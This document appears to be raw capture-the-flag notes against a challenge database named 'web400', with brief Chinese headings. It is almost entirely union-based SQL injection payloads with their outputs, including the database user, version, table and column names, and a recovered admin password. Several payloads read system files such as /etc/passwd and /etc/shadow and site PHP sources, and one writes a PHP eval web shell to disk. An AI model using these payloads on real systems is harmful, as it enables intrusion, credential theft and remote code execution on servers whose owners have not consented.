
' or (1) union select count(*) from information_schema.tables#
' or (1) union select user() from information_schema.tables#  root@localhost
admin' or (1) union select version() from information_schema.tables#          5.7.17-0ubuntu0.16.04.2
' or (1) union SELECT COUNT(*) FROM information_schema.SCHEMATA#          5

看当前数据库
' or (1) union select database()#      web400
看数据库里的表
' or (1) union select 1,2,group_concat(table_name) from information_schema.tables where TABLE_SCHEMA='web400'
' or (1) union SELECT group_concat(table_name) from information_schema.TABLES WHERE TABLE_SCHEMA = 'web400'#

看表里的列
' or (1) union SELECT group_concat(COLUMN_NAME) from information_schema.COLUMNS WHERE TABLE_NAME = 'USERS'#   username password data

看数据
' or (1) union SELECT password from web400.USERS#   zhegemimanigujicaibuchulai
' or (1) union SELECT username from web400.USERS#   admin
' or (1) union SELECT data from web400.USERS#   

  1' or (1) union select load_file('/etc/passwd')#
  1' or (1) union select load_file('/etc/mysql/mysql.conf.d/mysqld.cnf')#
  1' or (1) union select load_file('/var/run/mysqld/mysqld.pid')#
  1' or (1) union select load_file('/var/log/mysql/error.log')#
  1' or (1) union select load_file('/var/log/mysql/mysql.log')#
  1' or (1) union select "<?php @eval($_POST['c']); ?>" into outfile("/etc/shell.php")#
  1' or (1) union select load_file('migrate.php')#
  1' or (1) union select load_file('/home/web/www.zjusec.com/index.php')#
  1' or (1) union select load_file('/home/web/www.zjusec.com/rank.php')#
  1' or (1) union select load_file('/home/web/www.zjusec.com/play.php')#
  1' or (1) union select load_file('/home/web/www.zjusec.com/migrate.php')#
  1' or (1) union select load_file('/home/web/www.zjusec.com/i-am-the-config-and-flag.php')#
  1' or (1) union select load_file('/etc/shadow')#
  1' or (1) union select load data infile '/home/web/www.zjusec.com/i-am-the-config-and-flag.php' into table web400#
  /home/web/www.zjusec.com/migrate.php
